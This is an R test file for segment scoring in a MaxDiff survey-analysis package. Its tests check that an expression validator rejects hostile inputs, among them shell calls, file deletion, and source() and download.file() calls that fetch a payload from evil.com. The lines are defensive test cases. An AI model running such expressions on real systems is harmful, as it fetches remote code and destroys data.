# ==============================================================================
# MAXDIFF TESTS - SEGMENT ANALYSIS (08_segments.R)
# ==============================================================================
# Comprehensive tests for segment-level MaxDiff analysis
# Covers: validate_safe_expression, safe_eval_expression,
#         compute_segment_scores, compute_single_segment,
#         compare_segment_utilities

# ==============================================================================
# TEST DATA BUILDER
# ==============================================================================

#' Build a small, deterministic long_data + raw_data + items + segments config
#' for segment testing.
#'
#' 24 respondents, 4 items, 4 tasks, 3 items per task
#' Gender: 12 Male, 12 Female
#' Age_Group: 8 "18-34", 8 "35-54", 8 "55+"
build_segment_test_data <- function() {
  set.seed(42)


  n_resp <- 24
  n_items <- 4
  n_tasks <- 4
  items_per_task <- 3

  resp_ids <- sprintf("R%03d", seq_len(n_resp))
  item_ids <- paste0("I", seq_len(n_items))

  # Demographic columns
  gender <- rep(c("Male", "Female"), each = n_resp / 2)
  age_group <- rep(c("18-34", "35-54", "55+"), each = n_resp / 3)

  # raw_data: one row per respondent with demographics

  raw_data <- data.frame(
    Respondent_ID = resp_ids,
    Gender = gender,
    Age_Group = age_group,
    stringsAsFactors = FALSE
  )

  # Build a fixed design (same for all respondents for simplicity)
  design_rows <- list()
  set.seed(42)
  for (t in seq_len(n_tasks)) {
    shown <- sample(seq_len(n_items), items_per_task)
    for (p in seq_along(shown)) {
      design_rows[[length(design_rows) + 1]] <- data.frame(
        Version = 1, Task = t, Position = p, Item_Number = shown[p],
        stringsAsFactors = FALSE
      )
    }
  }
  design <- do.call(rbind, design_rows)

  # Build long_data: one row per (respondent, task, item_shown)
  long_rows <- list()
  set.seed(42)
  for (r in seq_len(n_resp)) {
    for (t in seq_len(n_tasks)) {
      task_items <- design$Item_Number[design$Task == t]
      # Pick best and worst deterministically based on respondent index
      best_idx <- ((r + t) %% length(task_items)) + 1
      worst_idx <- ((r + t + 1) %% length(task_items)) + 1
      if (worst_idx == best_idx) worst_idx <- (worst_idx %% length(task_items)) + 1

      best_item <- task_items[best_idx]
      worst_item <- task_items[worst_idx]

      for (item in task_items) {
        long_rows[[length(long_rows) + 1]] <- data.frame(
          resp_id = resp_ids[r],
          task = t,
          item_id = item_ids[item],
          is_best = as.integer(item == best_item),
          is_worst = as.integer(item == worst_item),
          weight = 1.0,
          stringsAsFactors = FALSE
        )
      }
    }
  }
  long_data <- do.call(rbind, long_rows)

  # Items config
  items <- data.frame(
    Item_ID = item_ids,
    Item_Label = paste("Item", LETTERS[seq_len(n_items)]),
    Item_Group = "Test",
    Include = rep(1L, n_items),
    Anchor_Item = rep(0L, n_items),
    Display_Order = seq_len(n_items),
    stringsAsFactors = FALSE
  )

  # Segment settings
  segment_settings <- data.frame(
    Segment_ID = c("seg_gender", "seg_age"),
    Segment_Label = c("Gender", "Age Group"),
    Variable_Name = c("Gender", "Age_Group"),
    Segment_Def = c("", ""),
    Include_in_Output = c(1L, 1L),
    stringsAsFactors = FALSE
  )

  # Output settings
  output_settings <- list(
    Min_Respondents_Per_Segment = 2
  )

  list(
    long_data = long_data,
    raw_data = raw_data,
    items = items,
    segment_settings = segment_settings,
    output_settings = output_settings,
    resp_ids = resp_ids,
    item_ids = item_ids,
    n_resp = n_resp
  )
}


# ==============================================================================
# 1. validate_safe_expression() TESTS
# ==============================================================================

test_that("validate_safe_expression accepts valid comparison expressions", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_true(validate_safe_expression('Age == "18-34"'))
  expect_true(validate_safe_expression('Gender == "Male"'))
  expect_true(validate_safe_expression('Score > 50'))
  expect_true(validate_safe_expression('Age >= 18 & Age <= 34'))
  expect_true(validate_safe_expression('Region %in% c("East", "West")'))
})

test_that("validate_safe_expression accepts empty and NULL expressions", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_true(validate_safe_expression(NULL))
  expect_true(validate_safe_expression(""))
  expect_true(validate_safe_expression("   "))
})

test_that("validate_safe_expression rejects system() calls", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_error(
    validate_safe_expression('system("ls")'),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression rejects file operations", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_error(
    validate_safe_expression('file.remove("/tmp/data.csv")'),
    class = "turas_refusal"
  )
  expect_error(
    validate_safe_expression('unlink("important_file")'),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression rejects eval and parse", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_error(
    validate_safe_expression('eval(parse(text = "1+1"))'),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression rejects library/require", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_error(
    validate_safe_expression('library(MASS)'),
    class = "turas_refusal"
  )
  expect_error(
    validate_safe_expression('require(ggplot2)'),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression rejects assignment operators", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  # Single = used for assignment (not ==) should be caught
  # Note: the function checks for = not preceded/followed by = or ! or < or >
  expect_error(
    validate_safe_expression('x <- system("whoami")'),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression rejects SQL-injection-like strings", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  # These contain unsafe functions like rm, source, stop
  expect_error(
    validate_safe_expression('rm(list = ls())'),
    class = "turas_refusal"
  )
  expect_error(
    validate_safe_expression('source("http://evil.com/payload.R")'),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression rejects invalid syntax", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_error(
    validate_safe_expression('Age ==== "bad"'),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression with allowed_vars rejects unknown variables", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_error(
    validate_safe_expression(
      'NonExistentVar == "value"',
      allowed_vars = c("Gender", "Age")
    ),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression with allowed_vars accepts known variables", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_true(
    validate_safe_expression(
      'Gender == "Male"',
      allowed_vars = c("Gender", "Age")
    )
  )
})


# ==============================================================================
# 2. safe_eval_expression() TESTS
# ==============================================================================

test_that("safe_eval_expression correctly evaluates a filter on a data frame", {
  skip_if(!exists("safe_eval_expression", mode = "function"))

  df <- data.frame(
    Gender = c("Male", "Female", "Male", "Female"),
    Age = c(25, 40, 55, 30),
    stringsAsFactors = FALSE
  )

  result <- safe_eval_expression('Gender == "Male"', df, context = "test")
  expect_is(result, "logical")
  expect_equal(length(result), 4)
  expect_equal(result, c(TRUE, FALSE, TRUE, FALSE))
})

test_that("safe_eval_expression returns logical vector of correct length", {
  skip_if(!exists("safe_eval_expression", mode = "function"))

  df <- data.frame(
    Score = c(10, 50, 80, 30, 90),
    stringsAsFactors = FALSE
  )

  result <- safe_eval_expression("Score > 40", df, context = "test")
  expect_equal(length(result), nrow(df))
  expect_equal(result, c(FALSE, TRUE, TRUE, FALSE, TRUE))
})

test_that("safe_eval_expression rejects expression with nonexistent column", {
  skip_if(!exists("safe_eval_expression", mode = "function"))

  df <- data.frame(
    Gender = c("Male", "Female"),
    stringsAsFactors = FALSE
  )

  # allowed_vars check in validate_safe_expression should catch unknown var
  expect_error(
    safe_eval_expression('FakeColumn == "X"', df, context = "test"),
    class = "turas_refusal"
  )
})

test_that("safe_eval_expression rejects dangerous expressions", {
  skip_if(!exists("safe_eval_expression", mode = "function"))

  df <- data.frame(x = 1:3, stringsAsFactors = FALSE)

  expect_error(
    safe_eval_expression('system("echo hacked")', df),
    class = "turas_refusal"
  )
})


# ==============================================================================
# 3. compute_segment_scores() TESTS
# ==============================================================================

test_that("compute_segment_scores returns NULL when no segments defined", {
  skip_if(!exists("compute_segment_scores", mode = "function"))

  td <- build_segment_test_data()

  result <- compute_segment_scores(
    long_data = td$long_data,
    raw_data = td$raw_data,
    segment_settings = data.frame(),
    items = td$items,
    output_settings = td$output_settings,
    verbose = FALSE
  )

  expect_null(result)
})

test_that("compute_segment_scores returns NULL for NULL segment settings", {
  skip_if(!exists("compute_segment_scores", mode = "function"))

  td <- build_segment_test_data()

  result <- compute_segment_scores(
    long_data = td$long_data,
    raw_data = td$raw_data,
    segment_settings = NULL,
    items = td$items,
    output_settings = td$output_settings,
    verbose = FALSE
  )

  expect_null(result)
})

test_that("compute_segment_scores produces results for Gender segment", {
  skip_if(!exists("compute_segment_scores", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  # Use only Gender segment
  seg_settings <- td$segment_settings[1, , drop = FALSE]

  result <- compute_segment_scores(
    long_data = td$long_data,
    raw_data = td$raw_data,
    segment_settings = seg_settings,
    items = td$items,
    output_settings = td$output_settings,
    verbose = FALSE
  )

  expect_false(is.null(result))
  expect_true("segment_scores" %in% names(result))
  expect_true("segment_summary" %in% names(result))

  # Should have two segment levels: Male and Female
  expect_equal(
    sort(unique(result$segment_summary$Segment_Value)),
    c("Female", "Male")
  )

  # Each segment level should have scores for all 4 items
  male_scores <- result$segment_scores[result$segment_scores$Segment_Value == "Male", ]
  female_scores <- result$segment_scores[result$segment_scores$Segment_Value == "Female", ]
  expect_equal(nrow(male_scores), 4)
  expect_equal(nrow(female_scores), 4)
})

test_that("compute_segment_scores segment sizes match expected counts", {
  skip_if(!exists("compute_segment_scores", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  seg_settings <- td$segment_settings[1, , drop = FALSE]

  result <- compute_segment_scores(
    long_data = td$long_data,
    raw_data = td$raw_data,
    segment_settings = seg_settings,
    items = td$items,
    output_settings = td$output_settings,
    verbose = FALSE
  )

  # 12 Male, 12 Female
  male_n <- unique(result$segment_scores$Segment_N[result$segment_scores$Segment_Value == "Male"])
  female_n <- unique(result$segment_scores$Segment_N[result$segment_scores$Segment_Value == "Female"])

  expect_equal(male_n, 12)
  expect_equal(female_n, 12)
})

test_that("compute_segment_scores respects Include_in_Output flag", {
  skip_if(!exists("compute_segment_scores", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  # Set both segments to exclude
  seg_settings <- td$segment_settings
  seg_settings$Include_in_Output <- c(0L, 0L)

  result <- compute_segment_scores(
    long_data = td$long_data,
    raw_data = td$raw_data,
    segment_settings = seg_settings,
    items = td$items,
    output_settings = td$output_settings,
    verbose = FALSE
  )

  expect_null(result)
})

test_that("compute_segment_scores count_scores have expected columns", {
  skip_if(!exists("compute_segment_scores", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()
  seg_settings <- td$segment_settings[1, , drop = FALSE]

  result <- compute_segment_scores(
    long_data = td$long_data,
    raw_data = td$raw_data,
    segment_settings = seg_settings,
    items = td$items,
    output_settings = td$output_settings,
    verbose = FALSE
  )

  scores <- result$segment_scores
  # Must have segment identifiers plus count score columns
  expect_true("Segment_ID" %in% names(scores))
  expect_true("Segment_Label" %in% names(scores))
  expect_true("Segment_Value" %in% names(scores))
  expect_true("Segment_N" %in% names(scores))
  expect_true("Item_ID" %in% names(scores))
  expect_true("Net_Score" %in% names(scores))
})


# ==============================================================================
# 4. compute_single_segment() TESTS
# ==============================================================================

test_that("compute_single_segment returns correct structure", {
  skip_if(!exists("compute_single_segment", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  # Build resp_data the same way compute_segment_scores does
  resp_data <- unique(td$long_data[, c("resp_id", "weight")])
  resp_data <- merge(
    resp_data,
    td$raw_data,
    by.x = "resp_id",
    by.y = "Respondent_ID",
    all.x = TRUE
  )

  result <- compute_single_segment(
    long_data = td$long_data,
    resp_data = resp_data,
    seg_var = "Gender",
    seg_def = "",
    seg_id = "seg_gender",
    seg_label = "Gender",
    items = td$items,
    min_n = 2,
    verbose = FALSE
  )

  expect_false(is.null(result))
  expect_true("scores" %in% names(result))
  expect_true("summary" %in% names(result))

  # Summary should have one row per segment level
  expect_true(nrow(result$summary) >= 2)
  expect_true("N" %in% names(result$summary))
})

test_that("compute_single_segment returns NULL for missing variable", {
  skip_if(!exists("compute_single_segment", mode = "function"))

  td <- build_segment_test_data()

  resp_data <- unique(td$long_data[, c("resp_id", "weight")])
  resp_data <- merge(
    resp_data,
    td$raw_data,
    by.x = "resp_id",
    by.y = "Respondent_ID",
    all.x = TRUE
  )

  result <- compute_single_segment(
    long_data = td$long_data,
    resp_data = resp_data,
    seg_var = "NonExistentVariable",
    seg_def = "",
    seg_id = "seg_none",
    seg_label = "Missing",
    items = td$items,
    min_n = 2,
    verbose = FALSE
  )

  expect_null(result)
})

test_that("compute_single_segment skips levels below min_n threshold", {
  skip_if(!exists("compute_single_segment", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  resp_data <- unique(td$long_data[, c("resp_id", "weight")])
  resp_data <- merge(
    resp_data,
    td$raw_data,
    by.x = "resp_id",
    by.y = "Respondent_ID",
    all.x = TRUE
  )

  # Set min_n very high so all levels are skipped
  result <- compute_single_segment(
    long_data = td$long_data,
    resp_data = resp_data,
    seg_var = "Gender",
    seg_def = "",
    seg_id = "seg_gender",
    seg_label = "Gender",
    items = td$items,
    min_n = 999,
    verbose = FALSE
  )

  expect_null(result)
})

test_that("compute_single_segment handles segment with only 1 respondent", {
  skip_if(!exists("compute_single_segment", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  resp_data <- unique(td$long_data[, c("resp_id", "weight")])
  resp_data <- merge(
    resp_data,
    td$raw_data,
    by.x = "resp_id",
    by.y = "Respondent_ID",
    all.x = TRUE
  )

  # Create a variable where only 1 respondent is "Rare"
  resp_data$Rarity <- "Common"
  resp_data$Rarity[1] <- "Rare"

  # With min_n = 1, the single respondent should still produce results
  result <- compute_single_segment(
    long_data = td$long_data,
    resp_data = resp_data,
    seg_var = "Rarity",
    seg_def = "",
    seg_id = "seg_rare",
    seg_label = "Rarity",
    items = td$items,
    min_n = 1,
    verbose = FALSE
  )

  expect_false(is.null(result))
  rare_summary <- result$summary[result$summary$Segment_Value == "Rare", ]
  expect_equal(rare_summary$N, 1)
})

test_that("compute_single_segment computes scores only on filtered respondents", {
  skip_if(!exists("compute_single_segment", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  resp_data <- unique(td$long_data[, c("resp_id", "weight")])
  resp_data <- merge(
    resp_data,
    td$raw_data,
    by.x = "resp_id",
    by.y = "Respondent_ID",
    all.x = TRUE
  )

  result <- compute_single_segment(
    long_data = td$long_data,
    resp_data = resp_data,
    seg_var = "Gender",
    seg_def = "",
    seg_id = "seg_gender",
    seg_label = "Gender",
    items = td$items,
    min_n = 2,
    verbose = FALSE
  )

  # Total N across segment levels should equal total respondents
  total_n <- sum(result$summary$N)
  expect_equal(total_n, td$n_resp)
})

test_that("compute_single_segment with all respondents in one level", {
  skip_if(!exists("compute_single_segment", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  resp_data <- unique(td$long_data[, c("resp_id", "weight")])
  resp_data <- merge(
    resp_data,
    td$raw_data,
    by.x = "resp_id",
    by.y = "Respondent_ID",
    all.x = TRUE
  )

  # Everyone is in the same group
  resp_data$Uniform <- "GroupA"

  result <- compute_single_segment(
    long_data = td$long_data,
    resp_data = resp_data,
    seg_var = "Uniform",
    seg_def = "",
    seg_id = "seg_uniform",
    seg_label = "Uniform",
    items = td$items,
    min_n = 1,
    verbose = FALSE
  )

  expect_false(is.null(result))
  expect_equal(nrow(result$summary), 1)
  expect_equal(result$summary$N, td$n_resp)
})


# ==============================================================================
# 5. compare_segment_utilities() TESTS
# ==============================================================================

test_that("compare_segment_utilities returns comparisons for two levels", {
  skip_if(!exists("compare_segment_utilities", mode = "function"))
  skip_if(!exists("compute_segment_scores", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()
  seg_settings <- td$segment_settings[1, , drop = FALSE]

  seg_result <- compute_segment_scores(
    long_data = td$long_data,
    raw_data = td$raw_data,
    segment_settings = seg_settings,
    items = td$items,
    output_settings = td$output_settings,
    verbose = FALSE
  )

  comparisons <- compare_segment_utilities(
    segment_scores = seg_result$segment_scores,
    segment_id = "seg_gender",
    items = td$items
  )

  expect_false(is.null(comparisons))
  expect_true("Difference" %in% names(comparisons))
  expect_true("Item_ID" %in% names(comparisons))
  expect_true("Level_A" %in% names(comparisons))
  expect_true("Level_B" %in% names(comparisons))

  # Should have one comparison row per included item
  n_included <- sum(td$items$Include == 1)
  expect_equal(nrow(comparisons), n_included)
})

test_that("compare_segment_utilities returns NULL for non-existent segment", {
  skip_if(!exists("compare_segment_utilities", mode = "function"))

  # Empty data frame with expected columns
  empty_scores <- data.frame(
    Segment_ID = character(),
    Segment_Value = character(),
    Item_ID = character(),
    Net_Score = numeric(),
    stringsAsFactors = FALSE
  )

  result <- compare_segment_utilities(
    segment_scores = empty_scores,
    segment_id = "nonexistent",
    items = data.frame(Item_ID = "I1", Include = 1, stringsAsFactors = FALSE)
  )

  expect_null(result)
})

test_that("compare_segment_utilities returns NULL for single level", {
  skip_if(!exists("compare_segment_utilities", mode = "function"))

  # Scores with only one segment level
  single_scores <- data.frame(
    Segment_ID = rep("seg1", 2),
    Segment_Value = rep("Only", 2),
    Item_ID = c("I1", "I2"),
    Net_Score = c(10, -5),
    stringsAsFactors = FALSE
  )

  items <- data.frame(
    Item_ID = c("I1", "I2"),
    Include = c(1, 1),
    stringsAsFactors = FALSE
  )

  result <- compare_segment_utilities(
    segment_scores = single_scores,
    segment_id = "seg1",
    items = items
  )

  expect_null(result)
})

test_that("compare_segment_utilities difference equals Score_A minus Score_B", {
  skip_if(!exists("compare_segment_utilities", mode = "function"))

  scores <- data.frame(
    Segment_ID = rep("seg1", 4),
    Segment_Value = rep(c("A", "B"), each = 2),
    Item_ID = rep(c("I1", "I2"), 2),
    Net_Score = c(20, -10, 5, 15),
    stringsAsFactors = FALSE
  )

  items <- data.frame(
    Item_ID = c("I1", "I2"),
    Include = c(1, 1),
    stringsAsFactors = FALSE
  )

  result <- compare_segment_utilities(
    segment_scores = scores,
    segment_id = "seg1",
    items = items
  )

  expect_false(is.null(result))

  # I1: Score_A=20, Score_B=5 -> Difference=15
  i1_row <- result[result$Item_ID == "I1", ]
  expect_equal(i1_row$Difference, 20 - 5)
  expect_equal(i1_row$Score_A, 20)
  expect_equal(i1_row$Score_B, 5)

  # I2: Score_A=-10, Score_B=15 -> Difference=-25
  i2_row <- result[result$Item_ID == "I2", ]
  expect_equal(i2_row$Difference, -10 - 15)
})


# ==============================================================================
# 6. EDGE CASES
# ==============================================================================

test_that("segment with 0 matching respondents returns NULL", {
  skip_if(!exists("compute_single_segment", mode = "function"))

  td <- build_segment_test_data()

  resp_data <- unique(td$long_data[, c("resp_id", "weight")])
  resp_data <- merge(
    resp_data,
    td$raw_data,
    by.x = "resp_id",
    by.y = "Respondent_ID",
    all.x = TRUE
  )

  # All NA segment values
  resp_data$EmptySeg <- NA_character_

  result <- compute_single_segment(
    long_data = td$long_data,
    resp_data = resp_data,
    seg_var = "EmptySeg",
    seg_def = "",
    seg_id = "seg_empty",
    seg_label = "Empty",
    items = td$items,
    min_n = 1,
    verbose = FALSE
  )

  expect_null(result)
})

test_that("compute_segment_scores handles segment with expression-based definition", {
  skip_if(!exists("compute_segment_scores", mode = "function"))
  skip_if(!exists("compute_maxdiff_counts", mode = "function"))

  td <- build_segment_test_data()

  # Add a numeric column to raw_data for expression filtering
  td$raw_data$Score <- seq_len(nrow(td$raw_data)) * 4

  # Define a segment using an expression
  seg_settings <- data.frame(
    Segment_ID = "seg_score",
    Segment_Label = "Score Group",
    Variable_Name = "Score",
    Segment_Def = "Score > 48",
    Include_in_Output = 1L,
    stringsAsFactors = FALSE
  )

  result <- compute_segment_scores(
    long_data = td$long_data,
    raw_data = td$raw_data,
    segment_settings = seg_settings,
    items = td$items,
    output_settings = td$output_settings,
    verbose = FALSE
  )

  # Expression evaluates to TRUE/FALSE, so segment values should be logical
  if (!is.null(result)) {
    expect_true(nrow(result$segment_summary) >= 1)
    expect_true(all(c("Segment_ID", "N") %in% names(result$segment_summary)))
  }
})

test_that("validate_safe_expression rejects download.file", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_error(
    validate_safe_expression('download.file("http://evil.com", "payload.R")'),
    class = "turas_refusal"
  )
})

test_that("validate_safe_expression rejects quit and q", {
  skip_if(!exists("validate_safe_expression", mode = "function"))

  expect_error(
    validate_safe_expression('q("no")'),
    class = "turas_refusal"
  )
  expect_error(
    validate_safe_expression('quit("no")'),
    class = "turas_refusal"
  )
})
